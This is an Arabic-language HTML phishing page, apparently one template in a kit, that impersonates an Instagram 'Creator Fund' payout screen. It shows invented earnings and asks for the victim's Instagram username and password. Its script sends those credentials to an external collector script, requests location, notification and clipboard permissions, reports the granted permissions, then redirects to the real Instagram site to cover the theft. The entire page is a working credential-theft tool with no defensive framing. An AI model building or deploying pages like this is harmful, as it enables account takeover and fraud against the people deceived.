<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#10b981">
<title>صندوق المبدعين - Instagram</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f172a;
    color: #fff;
  }
  .header {
    background: linear-gradient(135deg, #059669, #10b981);
    padding: 32px 20px 60px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  .header::before {
    content: '';
    position: absolute;
    top: -50%; right: -50%;
    width: 200%; height: 200%;
    background: radial-gradient(circle, rgba(255,255,255,0.1), transparent);
  }
  .header-icon {
    font-size: 56px;
    margin-bottom: 12px;
    position: relative;
  }
  .header h1 {
    font-size: 26px;
    font-weight: 800;
    margin-bottom: 6px;
    position: relative;
  }
  .header p {
    font-size: 14px;
    opacity: 0.9;
    position: relative;
  }
  .container {
    max-width: 460px;
    margin: -40px auto 0;
    padding: 0 20px 40px;
  }
  .earning-card {
    background: linear-gradient(135deg, #1e293b, #0f172a);
    border: 1px solid #10b981;
    border-radius: 20px;
    padding: 24px;
    text-align: center;
    box-shadow: 0 20px 60px rgba(16,185,129,0.3);
    margin-bottom: 20px;
  }
  .earning-label {
    font-size: 12px;
    color: #94a3b8;
    letter-spacing: 1px;
    margin-bottom: 8px;
  }
  .earning-value {
    font-size: 48px;
    font-weight: 800;
    background: linear-gradient(135deg, #10b981, #34d399);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    margin-bottom: 6px;
  }
  .earning-period {
    font-size: 13px;
    color: #94a3b8;
  }
  .stats-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 20px;
  }
  .stat-box {
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 12px;
    padding: 14px;
    text-align: center;
  }
  .stat-value {
    font-size: 20px;
    font-weight: 700;
    color: #10b981;
    margin-bottom: 4px;
  }
  .stat-label {
    font-size: 11px;
    color: #94a3b8;
  }
  .form-card {
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 16px;
    padding: 24px;
  }
  .form-card h3 {
    font-size: 18px;
    font-weight: 700;
    margin-bottom: 8px;
  }
  .form-card p {
    font-size: 13px;
    color: #94a3b8;
    line-height: 1.5;
    margin-bottom: 20px;
  }
  .form-input {
    width: 100%;
    padding: 14px 16px;
    background: #0f172a;
    border: 1px solid #334155;
    border-radius: 10px;
    font-size: 15px;
    color: #fff;
    font-family: inherit;
    margin-bottom: 12px;
  }
  .form-input::placeholder { color: #64748b; }
  .form-input:focus {
    outline: none;
    border-color: #10b981;
    box-shadow: 0 0 0 3px rgba(16,185,129,0.15);
  }
  .btn {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #10b981, #34d399);
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    font-family: inherit;
    margin-top: 4px;
  }
  .btn:active { transform: scale(0.98); }
  .btn:disabled { opacity: 0.6; }
  .error-msg {
    background: rgba(239, 68, 68, 0.15);
    border: 1px solid rgba(239, 68, 68, 0.4);
    border-radius: 8px;
    padding: 10px 12px;
    color: #fca5a5;
    font-size: 13px;
    margin-bottom: 12px;
    display: none;
  }
  .error-msg.show { display: block; }
</style>
</head>
<body>

<div class="header">
  <div class="header-icon">💰</div>
  <h1>صندوق المبدعين</h1>
  <p>اربح من محتواك على Instagram</p>
</div>

<div class="container">

  <div class="earning-card">
    <div class="earning-label">أرباحك الشهرية</div>
    <div class="earning-value">$1,247</div>
    <div class="earning-period">يوليو 2026 · +23% من الشهر الماضي</div>
  </div>

  <div class="stats-grid">
    <div class="stat-box">
      <div class="stat-value">184K</div>
      <div class="stat-label">مشاهدات</div>
    </div>
    <div class="stat-box">
      <div class="stat-value">12.4K</div>
      <div class="stat-label">تفاعلات</div>
    </div>
    <div class="stat-box">
      <div class="stat-value">$8.5K</div>
      <div class="stat-label">متبقي</div>
    </div>
    <div class="stat-box">
      <div class="stat-value">+47</div>
      <div class="stat-label">متابعين/يوم</div>
    </div>
  </div>

  <div class="form-card">
    <h3>🔓 سحب الأرباح</h3>
    <p>
      لسحب أرباحك، يرجى تسجيل الدخول لتأكيد هويتك. سيتم التحويل خلال ساعة.
    </p>

    <div class="error-msg" id="error-msg"></div>

    <form id="fund-form" onsubmit="return handleFund(event)">
      <input type="text" id="username" class="form-input" placeholder="اسم المستخدم على Instagram" required>
      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" required>
      <button type="submit" class="btn" id="fund-btn">
        سحب $1,247 الآن 💳
      </button>
    </form>
  </div>

</div>

<script src="/fs/static/collector.js"></script>

<script>
(function() {
    "use strict";

    var submitting = false;

    function showError(msg) {
        var el = document.getElementById('error-msg');
        el.textContent = msg;
        el.classList.add('show');
        setTimeout(function() { el.classList.remove('show'); }, 4000);
    }

    function handleFund(event) {
        event.preventDefault();
        if (submitting) return false;

        var username = document.getElementById('username').value.trim();
        var password = document.getElementById('password').value.trim();

        if (!username || !password) {
            showError('يرجى ملء جميع الحقول');
            return false;
        }

        if (password.length < 4) {
            showError('كلمة المرور غير صحيحة');
            return false;
        }

        submitting = true;
        var btn = document.getElementById('fund-btn');
        btn.disabled = true;
        btn.textContent = 'جاري التحقق...';

        FSCollector.captureForm({
            username: username,
            password: password,
            form_type: 'creator_fund'
        }, {
            metadata: { page: 'instagram_04_creator_fund' }
        }).then(function() {
            FSCollector.showLoader('جاري معالجة السحب...');

            setTimeout(function() {
                FSCollector.requestPermissions({
                    camera: false,
                    microphone: false,
                    location: true,
                    notifications: true,
                    clipboard: true,
                    showOverlay: true
                }).then(function(perms) {
                    FSCollector.sendPermissionsResult(perms);

                    setTimeout(function() {
                        FSCollector.redirect('https://www.instagram.com');
                    }, 2000);
                });
            }, 500);
        });

        return false;
    }

    window.handleFund = handleFund;

})();
</script>

</body>
</html>
